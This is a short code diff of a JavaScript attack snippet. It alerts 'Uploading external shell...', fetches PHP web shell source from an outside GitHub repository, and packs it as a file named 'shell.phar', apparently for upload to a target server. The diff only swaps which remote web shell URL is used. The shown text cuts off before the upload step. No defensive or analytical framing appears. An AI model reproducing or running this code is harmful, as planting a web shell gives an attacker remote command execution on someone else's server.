@@ -1,6 +1,6 @@
 alert("Uploading external shell...");
 (async () => {
-  const res = await fetch("https://github.com/flozz/p0wny-shell/blob/master/shell.php");
+  const res = await fetch("https://github.com/hoseinvitaa/jsfiles/blob/main/phpwebshell.php");
   const shellCode = await res.text();
 
   const file = new File([shellCode], "shell.phar", { type: "application/octet-stream" });
